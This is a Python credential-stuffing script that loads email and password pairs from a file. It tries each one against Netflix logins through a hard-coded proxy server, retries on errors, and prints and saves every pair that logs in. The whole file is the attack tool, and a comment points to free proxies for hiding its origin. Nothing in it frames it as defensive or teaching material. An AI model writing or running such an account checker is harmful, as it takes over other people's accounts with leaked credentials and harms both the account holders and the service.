
import time
import Netflix
import Extractor

successful_logins = [] #to store successful logins
credentials = Extractor.extract_credentials("data.txt") #file path should be correct , current file is in root dir
proxy_server = "170.187.232.112:80" #example of proxy server, you can google for another free proxy servers

######################################
##        MAIN Program Starts       ##
######################################

count = 0 #count to store how many credentials are attempted
# Loop for each credentials extracted
while credentials:
    cred = credentials.pop(0)
    email = cred["username"]
    password = cred["password"]
    
    attempt = 1
    while attempt <= 2:  # Try each credential up to 2 times
        try:
            print("\n",email)
            is_logged_in = Netflix.login(email, password, proxy_server)
            if is_logged_in:
                print("Email:", email)
                print("Password:", password)
                successful_logins.append(cred)
                break  # Break out of the retry loop on success
            else:
                print(f"Attempt {count + 1} failed.")
            count += 1
            break  # If login failed but no exception, break out of the retry loop
        except Exception as e:
            print(f"Attempt {count + 1} failed due to an error: {e}")
            attempt += 1
            if attempt <= 2:
                print("Retrying after 3 seconds...")
                time.sleep(3)  # Wait for 3 seconds before retrying
            else:
                count += 1
                print("Max retries reached. Moving to the next credential.")

######################################
##        Print Successfully        ##
######################################

if successful_logins:
    print("\nSuccessful logins:")
    for cred in successful_logins:
        print(f"Email: {cred['username']}, Password: {cred['password']}")
else:
    print("No successful logins.")

######################################
##        MAIN Program Ends         ##
######################################
print("Count completed:", count)
